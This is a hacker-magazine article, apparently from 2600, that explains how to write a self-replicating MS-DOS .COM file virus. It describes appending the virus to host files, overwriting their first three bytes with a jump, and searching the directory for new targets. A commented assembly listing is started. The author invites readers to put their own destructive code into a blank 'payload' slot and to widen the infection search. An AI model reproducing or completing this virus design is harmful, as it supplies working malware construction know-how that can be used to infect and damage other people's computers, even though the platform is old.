                 An MS-DOS Virus (By The Paranoid Panda)
		-----------------------------------------

The MS-DOS *.COM File is the simplest of all executable files. This format was
included in MS-DOS to provide compatibility with the CP\M operating system.
Allthough CP\M seems to be largely a thing of the past, *.COM files are still
being produced, so there is plenty of opportunity for infection.
As with the Atari virus I Gave you in Spring 1991 issue of 2600, this virus is
designed to infect executable files while still rendering them capable of 
fully performing their original, intended functions. Consequently, this is not
an overwrite virus, and preserves all of the infected file's original code.
The *.COM file has no program header, as do *.EXE files, and has no file 
trailer such as Atari *.PGM, *.TOS and *.TTP program files do. All the *.COM
file has is executable 80x86 instructions. It must be capable of loading in one
segment (64 Kbytes), along with the Program Segment Prefix (PSP) Created by 
MS-DOS at load time, as well as the two byte stack which is automatically 
created. Hence, the complete *.COM file must always be 64 Kbytes, less 256 
Bytes for the PSP, less 2 bytes for the stack. As a result, a candidate file
for infection must be short enough so that when its length is increased by the
length of the virus, it will still not exceed this maximum length, and MS-DOS
will still load it for execution.
MS-DOS will load *.COM files at offset 100 hex (100h using the MicroSoft 
Assembler notation), and all memory references in the program are short (i.e.
16 bit) addresses. This is, in essence, an absolute encoding and addressing
scheme, so that the virus code cannot be added at the beginning while moving
all the original code down in the address by the length of the virus.
The only way to add the virus is at the end, and to insert a short jump to the
virus beginning at the start of the file. This means that the first three 
bytes of the original code will be destroyed, so the virus must save these
three bytes between the end of the file's code and the beginning of the virus
code. Once the virus has completed execution, it restores the original three
to the file's beginning in RAM, and jumps there.
The comments in the accompanying listing pretty well tell the rest of the 
story, but a few words are still in order. There is a space in the code, at
symbolic location "payload:" for insertion of code which does the actual
"dirty work" of the virus. All you will find ther is a single "no op" in-
struction. You can add whatever you think best at that point. This code is
supplied for instructional purpose only, and all that clap-trap.
Note also that this particular version of the virus does not perform a very
sophisticated search for candidates for infection. The search will only be
performed in the directory where the already infected file resides, and does
not search any subdirectories. That's easy enough to fix, ans as the college
text books say, that is an exercise which is left to the student.

Happy Computing!

;File Virus.asm - This is the launch program for the Mark II virus
;It is to be assembled, linked, and converted to a *.com file using
;EXE2BIN. When run, it looks within the defined search space for other
;COM files to infect, and infects them. Then it runs its payload module.
;This launch program is structured like an infected file, so it contains
;a "dummy" host program like that which would be in an infected file.
;Control is returned to this dummy host program when this program runs.
;In the infected file, control will be returned to the actual program
;it contains after the payload module of its parasitic virus runs.
           _VIRUS SEGMENT
           ASSUME cs:_VIRUS,ds:_VIRUS,ss:_VIRUS
           ORG 100h
;This is the start of the dummy host program. Control is transferred
;here after the virus runs. All it does is terminate the program with
;a normal MS-DOS termination call, after having put out a message
;informing that the program has terminated normally.

;The next instruction is what is actually intended to be
;in the dummy host program. It is the beginning of the code which
;sets up the DOS call to write the termination message on the screen.
;The infected program which would have infected this one would have
;inserted a jump to the beginning of the virus over this, after saving
;what was actually there. When the virus completes, it will restore
;the parts of the mangled original host code, and run the host program.
;
;          mov bx,1
;
;What you see encoded below, using the "db" assembler pseudo-op, is
;the hand encoded jump to the beginning of the virus, installed by the
;program which would have infected this one. As it happens, the jump
;written into the beginning is the same length as the instruction
;(mov bx,1) which was there in the first place. In general, there
;is no guarantee just what will be there, and how long it will be.
;Since the program being infected is a COM program, the only guarantee
;is that the file will begin with some executable instruction. Thus,
;the program getting infected may have part of an executable instruction
;mangled by the inserted jump, or possibly one entire instruction plus
;part of another.
;
;The inserted code begins with "E9", the op-code byte for a jump relative
;to the contents of the IP as it will look after the jump plus displacement
;is fetched. (The IP will contain 103h. COM programs begin at offset
;100h, and the jump plus displacement requires 3 bytes.) The Next two
;bytes are the displacement to the beginning of the virus. The 
;displacement is calculated by the infecting program, as follows:
;
;D = displacement to be added to current IP (=103) to get to
;    virus start.
;D = Uninfected file length
;  -
;  Current IP (=103)
;  +
;  4 bytes storage space for the overwritten first instruction.
;
;  If the uninfected length of the target file is odd, a zero byte
;  will be added at its end before the virus code is attached.
;
;  The virus will thus begin on a word boundary, and NOP's inserted
;  by the assembler to put other things on a word boundary will still
;  perform their intended purpose.
